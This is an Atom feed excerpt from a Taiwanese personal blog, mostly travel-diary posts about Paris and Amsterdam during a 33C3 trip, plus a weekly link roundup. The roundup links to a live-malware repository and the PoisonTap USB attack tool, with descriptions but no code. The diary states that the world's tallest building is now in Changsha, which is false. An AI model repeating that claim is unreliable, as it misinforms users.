找個避雨處邊吃邊聊，&lt;br /&gt;
之後就在夜晚逛了漢堡市政廳一帶。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;接下來是為期 4 天的 CCC 議程，&lt;br /&gt;
本來是打算跟這篇寫在一起，&lt;br /&gt;
但後來覺得性質不同，&lt;br /&gt;
所以另外整理到歸類在 Conference 的文章紀錄，&lt;br /&gt;
接下來只會記一些跟 CCC 無關但跟漢堡有關的部份。  &lt;/p&gt;
&lt;p&gt;CCC 會期總共四天，&lt;br /&gt;
我一樣分成四篇文章紀錄，&lt;br /&gt;
接下來的四篇，&lt;br /&gt;
每篇都會有連結連到當天的 CCC 議程相關紀錄的文章。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/27/33c3-暨歐洲法荷德聖誕跨年遊-8"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (8)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Amsterdam"></category></entry><entry><title>Y2016W51</title><link href="https://blog.m157q.tw/posts/2016/12/26/y2016w51/" rel="alternate"></link><published>2017-02-06T02:49:04+08:00</published><updated>2017-02-06T02:49:04+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-12-26:posts/2016/12/26/y2016w51/</id><summary type="html">&lt;h3&gt;bigquery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/encrypted-bigquery-client/blob/master/tutorial.md"&gt;encrypted-bigquery-client/tutorial.md at master · google/encrypted-bigquery-client · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This tutorial provides a step by step guide to using the encrypted BigQuery client (ebq).  The command line tool "bq" is extended and named "ebq" (i.e. encrypted bq) which encrypts data before loading and transforms query to work over encrypted data.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;就如同字面上的意思，可以幫 bigquery 作加密的 bigquery cli。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jaceju.net/2016-12-24-be-a-senior-engineer/"&gt;接近 2016 年底的我是否有資格稱為資深工程師 | 網站製作學習誌&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇真的好棒啊！我覺得值得過一陣子就再看一次順便對自己做反省。  &lt;/li&gt;
&lt;li&gt;自己有些有做到有些沒做到，讓自己向這些目標努力吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ytisf/theZoo"&gt;ytisf/theZoo: A repository of LIVE malwares for your own joy and pleasure&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;theZoo is a project created to make the possibility of malware analysis open and available to the public.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這個沒記錯的話應該是在 33C3 看到有人介紹的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.freebuf.com/sectool/120354.html"&gt;30秒攻破任意密码保护的PC：深入了解5美元黑客神器PoisonTap - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/samyk/poisontap"&gt;https://github.com/samyk/poisontap&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;PoisonTap is built for the $5 Raspberry Pi Zero without any additional components other than a micro-USB cable &amp;amp; microSD card, or can work on any Raspberry Pi (1/2/3) with an Ethernet-to-USB/Thunderbolt dongle, or can work on other devices that can emulate USB gadgets such as USB Armory and LAN Turtle.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;README 的頁面介紹的挺詳細的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不如被我閒置的 RPi 1 B+ 就裝這個來玩好了，接上 USB 就可以作用了，而且還通吃 Windows/Mac/Linux。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;technews&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.facebook.com/posts/1186557928107489/reviewing-aquila-s-first-full-scale-test-flight"&gt;Reviewing Aquila's first full-scale test flight | Engineering Blog | Facebook Code | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Facebook 在造太陽能飛機  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://umaar.github.io/devtools-optimise-your-web-development-workflow-2016/#/"&gt;Optimise your web development workflow 2016&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個挺詳細的投影片教你怎麼使用 Chrome 瀏覽器自帶的 devtools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=_vTEKDQPfXk"&gt;這種發票不能丟紙類回收!! - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你知道紙本電子發票是不能丟紙類回收的嗎?它上面有許多的塗佈層，目前的技術還難以將它完全和紙質脫離，所以別再丟紙類啦  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;又被高中同學教學了，這篇超級多人分享的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;travel&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cpwen2013.pixnet.net/blog/post/4547923-%E5%BE%9E%E6%AD%90%E6%B4%B2%E5%AF%84%E6%98%8E%E4%BF%A1%E7%89%87%E5%88%B0%E4%BA%9E%E6%B4%B2"&gt;從歐洲寄明信片到亞洲 @ Betty &amp;amp; Ben帶著背包走出去，裝著回憶寫下來 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為要從歐洲寄明信片回臺灣，這篇寫的還算詳細，時間也不會算太舊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="bigquery"></category><category term="blog"></category><category term="security"></category><category term="technews"></category><category term="travel"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (6)</title><link href="https://blog.m157q.tw/posts/2016/12/25/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-6/" rel="alternate"></link><published>2017-01-15T00:51:59+08:00</published><updated>2017-01-15T00:51:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-25:posts/2016/12/25/33c3-暨歐洲法荷德聖誕跨年遊-6/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/24/33c3-暨歐洲法荷德聖誕跨年遊-5"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (5)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 6 2016/12/25 Sun&lt;/h2&gt;
&lt;p&gt;早上花了 7.9 歐吃了旅館的歐式吃到飽自助早餐，&lt;br /&gt;
荷蘭麵包、全麥五穀吐司、一般吐司、甜麵包，&lt;br /&gt;
三種奶油，&lt;br /&gt;
小黃瓜、番茄，&lt;br /&gt;
三種起司，&lt;br /&gt;
冰牛奶、熱咖啡，&lt;br /&gt;
麥片、穀物，&lt;br /&gt;
甜點、水果，&lt;br /&gt;
其實還挺超值的。  &lt;/p&gt;
&lt;p&gt;之後買了要 5.525 歐的來回票，&lt;br /&gt;
搭火車前往阿姆斯特丹中央車站。  &lt;/p&gt;
&lt;p&gt;前往皇宮前的廣場參加 Free tour，&lt;br /&gt;
兩個小時內帶著我們走一些附近著名的景點。&lt;br /&gt;
終於參加到朋友一直想參加的 Free tour 了，&lt;br /&gt;
參加完後的感覺真的覺得還不錯，&lt;br /&gt;
等於是有當地的導遊讓你很快瞭解這個城市的事情，&lt;br /&gt;
然後大概都要付 10 ~ 15 歐的小費，&lt;br /&gt;
Free tour 的相關網站上都會寫 Average tips，&lt;br /&gt;
可以當作給小費的參考。  &lt;/p&gt;
&lt;p&gt;以下紀錄一下 Free Tour 導遊的一些介紹：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第一站就是集合點的皇宮，&lt;br /&gt;
皇宮旁完全沒有護欄，&lt;br /&gt;
導致很多人喝醉了以後喜歡直接在皇宮旁尿尿，&lt;br /&gt;
讓荷蘭皇室很困擾，&lt;br /&gt;
但他們又不想禁止人民靠近皇宮，&lt;br /&gt;
因為他們總是嘗試想用比較不同的方法來解決一些問題，&lt;br /&gt;
例如紅燈區的設立、一定狀況下施用大麻的規定等等&lt;br /&gt;
於是他們想出了一個方法，&lt;br /&gt;
就是在皇宮周圍架探照燈，&lt;br /&gt;
有人在晚上靠近皇宮的話，&lt;br /&gt;
探照燈就會亮起，&lt;br /&gt;
這樣他們就不敢當著燈光下小便，&lt;br /&gt;
畢竟尿液其實對皇宮的建築挺傷的，&lt;br /&gt;
而且氣味也不佳。&lt;br /&gt;
（歐洲真的超多就在路邊小便的男子）&lt;br /&gt;
結果他們發現這方法還算有用，&lt;br /&gt;
隨便在皇宮旁小便的人真的減少了。  &lt;/p&gt;
&lt;p&gt;然後提到了荷蘭皇室的成年禮，&lt;br /&gt;
主要是要扮成平民瞭解人民的生活狀況，&lt;br /&gt;
現在的荷蘭國王成年禮的時候在酒吧跟人邊喝啤酒邊聊天，&lt;br /&gt;
於是得到了 Beer Prince 的稱號。&lt;br /&gt;
然後皇室認為這樣的王子可能太親民了，&lt;br /&gt;
於是找了一個強悍的阿根廷女生當他的皇后，&lt;br /&gt;
生下的公主現在也差不多十五、六歲了，&lt;br /&gt;
然後導遊就開玩笑的猜測人們可能會叫他 Tequila Princess XD。  &lt;/p&gt;
&lt;p&gt;之後就前往 Canal 旁，&lt;br /&gt;
整個阿姆斯特丹基本上就是被 Canal 以同心圓環繞。&lt;br /&gt;
橋與原本的地面的高度有不小的落差，&lt;br /&gt;
導遊說這是因為以前這條算是護城河，&lt;br /&gt;
用來保護皇宮用的。&lt;br /&gt;
然後順便講述荷蘭的建築，&lt;br /&gt;
愈有錢的人，房子會愈寬，然後房子會成對稱狀，中間會有兩扇門。&lt;br /&gt;
比較沒錢的人就一樣得分租一間房子，&lt;br /&gt;
然後說 "Go Dutch" 的由來是跟房子的分租有關係，&lt;br /&gt;
因為一間裏面可能會再拆成很小間。  &lt;/p&gt;
&lt;p&gt;阿姆斯特丹許多房子是呈現傾斜狀的，&lt;br /&gt;
有些原因是因為地質的關係，&lt;br /&gt;
畢竟荷蘭的建築都是蓋在沼澤地上，&lt;br /&gt;
地基比較不穩固，&lt;br /&gt;
不過他們的建築都會考慮到這個方面，&lt;br /&gt;
所以房子即便有點傾斜了還是能夠住，&lt;br /&gt;
然而買房子第一個看的不是房子多大，&lt;br /&gt;
而是察看地基的狀況。  &lt;/p&gt;
&lt;p&gt;另外一些是刻意設計成傾斜的，&lt;br /&gt;
因為一般的房子中，&lt;br /&gt;
門面窄導致樓梯會很陡，&lt;br /&gt;
要搬運東西到高樓層很麻煩，&lt;br /&gt;
所以頂樓都會有個吊臂，&lt;br /&gt;
東西就直接從窗外吊上去，&lt;br /&gt;
設計成傾斜的話可以比較省力。  &lt;/p&gt;
&lt;p&gt;荷蘭人基本上不會隨意改變房子的外觀。  &lt;/p&gt;
&lt;p&gt;荷蘭的小孩基本上一定要會的三件事：游泳、騎腳踏車、溜冰&lt;br /&gt;
因為荷蘭到處都是運河，而且運河旁邊都沒有護欄，很容易掉下去&lt;br /&gt;
如果掉下去不會游泳的話就死定了。&lt;br /&gt;
騎腳踏車就不用說了，荷蘭人超級愛騎腳踏車。&lt;br /&gt;
至於運河邊為什麼不要加圍牆或護欄？&lt;br /&gt;
「從以前開始就這樣了，這是很正常的事，沒什麼需要改變的。反正運河深度大概四公尺，有一公尺是喝酒醉掉下去的人，有兩公尺是腳踏車。」&lt;br /&gt;
我們的皇后都在運河裏面游泳過了，所以運河很安全的，雖然她游的時候身邊有 5 個保鏢陪她一起游。  &lt;/p&gt;
&lt;p&gt;阿姆斯特丹的市徽是 XXX，&lt;br /&gt;
外銷 dirty movie 的時候寫 dirty movie from Amsterdam 很容易被退貨，直接寫 XXX 就好。&lt;br /&gt;
(感覺 .xxx 的 domain name 跟這應該有關)  &lt;/p&gt;
&lt;p&gt;大麻在這邊雖然合法，&lt;br /&gt;
但不是像一般人所想的那樣可以四處使用，&lt;br /&gt;
不然也不用特地取一個 "Coffeeshop" 這樣隱諱的名字，&lt;br /&gt;
直接叫 weed house 之類的就好了。&lt;br /&gt;
基本上跟菸酒一樣都是十八禁的物品，&lt;br /&gt;
每個人可以合法攜帶 5 公克以下的大麻，&lt;br /&gt;
只能在特地的區域使用，通常是 Coffeeshop 內。&lt;br /&gt;
（雖然路上還是有人會抽就是，算是灰色地帶）&lt;br /&gt;
但在一些顯眼的公共場合還是會被禁止的，&lt;br /&gt;
許多飯店的門口都會貼個禁止抽大麻的標誌，&lt;br /&gt;
當然也不能在學校前面就當街抽起大麻煙給學生看。&lt;br /&gt;
大麻也是有分種類的，&lt;br /&gt;
有會讓人 high 的，也有不會讓人 high 的，&lt;br /&gt;
賣給觀光客的大麻棒棒糖、大麻餅乾基本上都是不會讓人 high 的那種，基本上只有大麻的味道。&lt;br /&gt;
只有在 Coffeeshop 才能合法販售會讓人 high 的大麻。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;結束之後就和另外兩位朋友會合，去附近逛逛。&lt;br /&gt;
到 Albert Heijn 超市逛逛，&lt;br /&gt;
結果看到 1 公升牛奶只要不到 1 歐就馬上買了一瓶，&lt;br /&gt;
然後還有超級便宜的起司，於是也買了四種不同口味的，打算帶回台灣吃。  &lt;/p&gt;
&lt;p&gt;逛完超市之後去逛附近的市集，&lt;br /&gt;
不意外的有許多跟大麻有關的東西，&lt;br /&gt;
大麻棒棒糖、大麻種子等等，&lt;br /&gt;
也有很多賣花的，&lt;br /&gt;
但沒有看到活株的大麻，&lt;br /&gt;
應該是有相關法律禁止直接販售。  &lt;/p&gt;
&lt;p&gt;之後在附近找到了一間還不錯的義大利餐廳，&lt;br /&gt;
Pasta 挺好吃的，只要 10.5 歐  &lt;/p&gt;
&lt;p&gt;之後回旅館的大廳，&lt;br /&gt;
一個人在弄報告，&lt;br /&gt;
所以我和另外兩人開始玩起疊疊樂，&lt;br /&gt;
輪流的空檔我就開著 Vim 寫這篇遊記。&lt;br /&gt;
結果突然有位男生從我後面拍我的肩膀，&lt;br /&gt;
他是坐在我右後方那桌人的其中一位，&lt;br /&gt;
應該是看到我螢幕的畫面覺得很 geek，&lt;br /&gt;
問我說我是不是邊玩疊疊樂邊開程式在算要拿哪個積木 (XD&lt;br /&gt;
之後跟他解釋說這只是個編輯器，&lt;br /&gt;
我在寫日記，&lt;br /&gt;
然後如果要寫他說的那種程式的話起碼要有個 Camera 拍疊疊樂的積木狀況，&lt;br /&gt;
然後稍微閒聊一下說我們是臺灣來的，&lt;br /&gt;
然後平常有在寫程式這樣。  &lt;/p&gt;
&lt;p&gt;在我和被那位男生搭訕的時候，&lt;br /&gt;
另外兩位已經跑去隔壁桌和兩位巴黎來的女生一起玩哩。&lt;br /&gt;
之後我也加入一起玩，&lt;br /&gt;
但玩沒幾局我們三個相繼輸掉，&lt;br /&gt;
她們兩個女生則都沒輸過，&lt;br /&gt;
然後我們又沒什麼話聊，&lt;br /&gt;
後來她們就說有事就走啦。&lt;br /&gt;
（我們不夠主動，她們也不主動，所以其實有點乾。外國女生真的沒有比較主動啦，不然就是我們膚色不對？但老實說其中一位算是我的菜，不過我就是克服不了心理障礙）  &lt;/p&gt;
&lt;p&gt;然後有嘗試了一下在 Coffeeshop 買來的煙和蛋糕，&lt;br /&gt;
其實沒啥特別感覺，&lt;br /&gt;
就是有點暈眩和嚴重的打瞌睡。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/26/33c3-暨歐洲法荷德聖誕跨年遊-7"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (7)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Amsterdam"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (5)</title><link href="https://blog.m157q.tw/posts/2016/12/24/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-5/" rel="alternate"></link><published>2017-01-15T00:50:59+08:00</published><updated>2017-01-15T00:50:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-24:posts/2016/12/24/33c3-暨歐洲法荷德聖誕跨年遊-5/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/23/33c3-暨歐洲法荷德聖誕跨年遊-4"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (4)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 5 2016/12/24 Sat&lt;/h2&gt;
&lt;p&gt;天氣總算放晴了。&lt;br /&gt;
今天有另外兩位要一起去 CCC 的朋友飛抵巴黎，&lt;br /&gt;
相約在凱旋門會合。  &lt;/p&gt;
&lt;p&gt;從 Anvers 站搭地鐵到 Concorde 站，&lt;br /&gt;
出站後有個非常漂亮的公園 Jardin des Tuileries，&lt;br /&gt;
偌大的水池有許多鳥兒在此憩居，&lt;br /&gt;
孩童在水池前與鴿子玩得不亦樂乎，&lt;br /&gt;
周圍被好幾座漂亮的雕像圍繞，&lt;br /&gt;
還有因兩旁楓樹的樹枝被刻意修剪過而顯得開闊的大道，&lt;br /&gt;
真的讓人感到非常悠閒。&lt;br /&gt;
公園內也有座不少人參觀的博物館 Musee de l'Orangerie。  &lt;/p&gt;
&lt;p&gt;旁邊就是著名的 Avenue des Champ-Elysees (香舍利榭大道)，&lt;br /&gt;
有座噴水池位於這一頭的圓環中央，&lt;br /&gt;
在大道的另一頭就是著名的凱旋門。&lt;br /&gt;
有座摩天輪就坐落在公園與圓環廣場中間。  &lt;/p&gt;
&lt;p&gt;之後沿著香舍利榭大道往凱旋門的方向走，&lt;br /&gt;
兩旁有著比昨晚在艾菲爾鐵塔旁更大的聖誕市集，&lt;br /&gt;
賣的東西種類也更多更豐富，&lt;br /&gt;
我們就邊走邊逛，&lt;br /&gt;
更靠近凱旋門方向就沒有聖誕市集了，&lt;br /&gt;
而是原本熟知的香舍利榭大道那些精品店，&lt;br /&gt;
我們只進去迪士尼的店面逛了一下，&lt;br /&gt;
一樣要安檢，&lt;br /&gt;
其實因為巴黎的景點實在是太多了，&lt;br /&gt;
很多人都會忽略掉其實巴黎有迪士尼樂園這個事實。  &lt;/p&gt;
&lt;p&gt;在通往凱旋門的地下道聽到一個很棒的小提琴街頭表演，&lt;br /&gt;
原本沒看見的時候還以為是凱旋門入口處播放的音樂呢。  &lt;/p&gt;
&lt;p&gt;晚上搭 17:25 從 Gare de Nord（巴黎北站)出發前往 Amsterdam （阿姆斯特丹）的 Thalys 火車前往荷蘭。&lt;br /&gt;
上火車之前一樣要過安檢門，且行李也都要接受安檢。&lt;br /&gt;
每節車廂的座位方向挺神奇的，都是面向車廂的中間，&lt;br /&gt;
不知道這樣設計是不是為了中間有桌子的座位可以賣比較高的價錢？&lt;br /&gt;
其中某一節車廂則是吧台，&lt;br /&gt;
提供不少食物與飲料，&lt;br /&gt;
也有開放站立的空間讓人邊吃邊聊天，&lt;br /&gt;
還有個喇叭放著音樂，&lt;br /&gt;
雖然空間不大，&lt;br /&gt;
但還挺不錯的。  &lt;/p&gt;
&lt;p&gt;到達 Amsterdam 後，&lt;br /&gt;
買了很貴的一張要 3.3 歐的火車票，&lt;br /&gt;
而且只搭一站前往旅館 Meininger check in，&lt;br /&gt;
行李放好後又出來搭火車到 Amsterdam 去市中心逛逛，&lt;br /&gt;
原本想說順便去 Coffeeshop 買東西，&lt;br /&gt;
但帶路的朋友路不熟，&lt;br /&gt;
所以沒買著。&lt;br /&gt;
然後路過了一條小小的 Red Light District （紅燈區）。&lt;br /&gt;
之後因為肚子餓了，所以晃了一陣子找到一間 Kebab 吃宵夜，&lt;br /&gt;
3 個人吃了 23.5 歐，&lt;br /&gt;
其實本來應該只有 20.5 歐，&lt;br /&gt;
不過老闆拿了個麵包來問我們要不要吃，&lt;br /&gt;
我們以為是送的，就答應了，&lt;br /&gt;
結果沒想到要價三歐，&lt;br /&gt;
雖然不難吃就是。  &lt;/p&gt;
&lt;p&gt;結束之後就搭一點多的火車回旅館那站，&lt;br /&gt;
晚上一點半左右竟然還有火車真的令我挺訝異的，&lt;br /&gt;
台灣的火車在這個時間應該都已經沒班次了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/25/33c3-暨歐洲法荷德聖誕跨年遊-6"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (6)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (4)</title><link href="https://blog.m157q.tw/posts/2016/12/23/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-4/" rel="alternate"></link><published>2017-01-15T00:48:59+08:00</published><updated>2017-01-15T00:48:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-23:posts/2016/12/23/33c3-暨歐洲法荷德聖誕跨年遊-4/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/22/33c3-暨歐洲法荷德聖誕跨年遊-3"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (3)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 4 2016/12/23 Fri&lt;/h2&gt;
&lt;p&gt;今天是陰天。&lt;br /&gt;
早上 8 點多就醒了，&lt;br /&gt;
梳洗之後打開筆電開始補上前幾天的遊記，&lt;br /&gt;
不知不覺就寫到十一點多，&lt;br /&gt;
同行的朋友也差不多在這個時間起床。&lt;br /&gt;
決定今天前往艾菲爾鐵塔參觀，&lt;br /&gt;
但因為肚子餓了，&lt;br /&gt;
決定先在附近解決早午餐。&lt;br /&gt;
出旅館後，&lt;br /&gt;
在轉角處發現有個臨時擺設的聖誕市集，&lt;br /&gt;
走近一看發現是個小小的菜市場，&lt;br /&gt;
因為聖誕節的到來，&lt;br /&gt;
所有攤商都戴上了聖誕帽，&lt;br /&gt;
非常的應景。&lt;br /&gt;
種類非常的多，&lt;br /&gt;
每個商家賣的東西都沒有重複，&lt;br /&gt;
肉類、海鮮、蔬果、麵包、派等等，&lt;br /&gt;
但沒什麼可以立即食用的，&lt;br /&gt;
所以我們決定前往聖心堂附近找個食物裹腹。  &lt;/p&gt;
&lt;p&gt;不知道是不是星期五的關係，&lt;br /&gt;
路上出現了用三個小鐵桶和一顆球就擺起地攤和路人賭錢的人，&lt;br /&gt;
一路上很多都是，&lt;br /&gt;
玩法也很簡單，&lt;br /&gt;
就他會把球的位置換來換去，&lt;br /&gt;
等到他停了就可以開始猜，&lt;br /&gt;
要跟他賭的話就把錢拿到他手上，&lt;br /&gt;
用腳踩或蹲下用手拿開你覺得有放球的那個鐵桶，&lt;br /&gt;
我看了一下，&lt;br /&gt;
都是有球的情況就是，&lt;br /&gt;
其實大概就像台灣的香腸攤賭香腸的那種感覺。&lt;br /&gt;
看到有些人玩的很開心，&lt;br /&gt;
不過網路上有許多人說這是騙局就是，&lt;br /&gt;
開賭的莊家跟玩的很開心的路人是同夥的，&lt;br /&gt;
為了吸引觀光客的注意，&lt;br /&gt;
讓你在旁邊看的時候故意看得到球，&lt;br /&gt;
等你上鉤後投下 50 歐、100 歐的賭注後，&lt;br /&gt;
要你選球在哪個鐵桶裡，&lt;br /&gt;
球就消失了，&lt;br /&gt;
觀光客被騙了錢，&lt;br /&gt;
然後他們鳥獸散，&lt;br /&gt;
等沒多久再次群聚，&lt;br /&gt;
等下個肥羊上鉤。&lt;br /&gt;
總之我是沒有玩就是，&lt;br /&gt;
會擔心的就像我一樣看看就好，&lt;br /&gt;
反正十賭九騙不是說假的。  &lt;/p&gt;
&lt;p&gt;最後是到聖心堂前面的一間小店買了個 3 EUR 的 Sandwitch，&lt;br /&gt;
然後從旁邊的樓梯爬到聖心堂前，&lt;br /&gt;
邊看巴黎的風景邊聽街頭藝人的音樂邊享受早餐，&lt;br /&gt;
稍微注意了一下，&lt;br /&gt;
今天沒有幸運手環黑人幫，&lt;br /&gt;
不知道是不是聖誕節將近而且又是星期五所以放假去了。  &lt;/p&gt;
&lt;p&gt;享用完早餐後，&lt;br /&gt;
走到 Anvers 搭地鐵 2 號線往 Porte Dauphine 的方向到 Charles de Gaulle-Etoile，&lt;br /&gt;
（這站一出來就是著名的凱旋門 Arc de Triomphe）&lt;br /&gt;
再轉乘 6 號線往 Nation 的方向到 Bir-Hakeim 站，&lt;br /&gt;
（全面啟動電影場景裡頭的那座橋就在這）&lt;br /&gt;
出站的指示牌上都會特別標明 Tour Eiffel，照著走就行了。&lt;br /&gt;
（其實搭到 Camp de mars Tour Eiffel 會更近，不過我們的路線無法搭到那就是。）&lt;br /&gt;
從站內開始一路到艾菲爾鐵塔周圍全都是擺地攤賣紀念品的黑人幫，&lt;br /&gt;
每攤賣的東西都一樣，&lt;br /&gt;
基本上都是艾菲爾鐵塔的小吊飾，&lt;br /&gt;
5 個 1 歐元，&lt;br /&gt;
也有順便賣自拍棒，&lt;br /&gt;
有些會比較主動問你要不要賣，&lt;br /&gt;
基本上不要理他或跟他說 no 他就不會煩你了，&lt;br /&gt;
不會很恐怖。&lt;br /&gt;
艾菲爾鐵塔的附近一樣到處都有一直問你「Do you speak English?」的女生要你填問卷，&lt;br /&gt;
基本上裝成不懂英文不要理她們就好，&lt;br /&gt;
耳聞有很多不同的狀況：&lt;br /&gt;
趁你填問卷的時候把手偷偷摸進你背包偷東西、&lt;br /&gt;
趁你填問卷的時候把你的行李箱拉走、&lt;br /&gt;
等你簽完以後，一群人圍上來要你給錢才肯罷休、&lt;br /&gt;
我是沒有打算親自嘗試就是，&lt;br /&gt;
所以遇到都沒有理他們。  &lt;/p&gt;
&lt;p&gt;艾菲爾鐵塔附近是個廣大的公園，&lt;br /&gt;
挺適合在這裡度過一個愜意的下午。&lt;br /&gt;
入口處得進行簡單的安檢，&lt;br /&gt;
購票分為搭乘電梯或走樓梯的類型，&lt;br /&gt;
因為是窮游巴黎，&lt;br /&gt;
所以我和朋友選擇用走樓梯的，&lt;br /&gt;
走樓梯的票一律可以走到第二層，&lt;br /&gt;
普通票要 7 歐，18~24 歲只要 5 歐，&lt;br /&gt;
差一歲就要多花 2 歐元爬樓梯，算是小確幸吧。  &lt;/p&gt;
&lt;p&gt;開始爬的時候，&lt;br /&gt;
每個樓梯的轉角都會有關於艾菲爾相關的簡單介紹，&lt;br /&gt;
我覺得挺適合停下來觀看的。&lt;br /&gt;
例如學士畢業以後也是開始學習各種建築相關的實用知識，&lt;br /&gt;
直到 32 歲才自己創業，&lt;br /&gt;
直到設計艾菲爾鐵塔而聲名大噪之前，&lt;br /&gt;
也已經有許多有些代表性的作品，&lt;br /&gt;
之後還參與了自由女神的建造，&lt;br /&gt;
在世界各地的許多地方也有其作品。  &lt;/p&gt;
&lt;p&gt;爬上去第一層之後，&lt;br /&gt;
就開始逛一整圈，&lt;br /&gt;
除了看美麗的風景拍照以外，&lt;br /&gt;
也有艾菲爾鐵塔和世界各地的高樓相關的介紹可以看，&lt;br /&gt;
例如有個影片就播放著艾菲爾鐵塔每 7 年就得重新油漆，每次約 25 位油漆工，用掉好幾噸的油漆等等，&lt;br /&gt;
然後播放著每次油漆的紀錄片，&lt;br /&gt;
真的覺得法國人對於歷史的保存與紀錄非常的重視。&lt;br /&gt;
影片中最後一次的油漆是 2009 年，&lt;br /&gt;
這麼算起來今年應該也要油漆一次，&lt;br /&gt;
不過我不確定今年有沒有重新油漆過就是了，&lt;br /&gt;
實際觀察了一下感覺應該是沒有，&lt;br /&gt;
由於影片是 2014 年做的，&lt;br /&gt;
所以我也無從得知就是。  &lt;/p&gt;
&lt;p&gt;然後看了介紹才知道，&lt;br /&gt;
原來杜拜塔已經不是世界最高的建築了，&lt;br /&gt;
目前世界最高的建築是在中國的長沙。  &lt;/p&gt;
&lt;p&gt;之後去了紀念品店吹吹暖氣，&lt;br /&gt;
然後噴了 50 歐買了紀念品，&lt;br /&gt;
香水、餅乾、明信片、酒杯、法國長棍原子筆，&lt;br /&gt;
其實原本還想買個腳底長了四支腳的鐵塔馬克杯，&lt;br /&gt;
紀念品店真是邪惡的地方。  &lt;/p&gt;
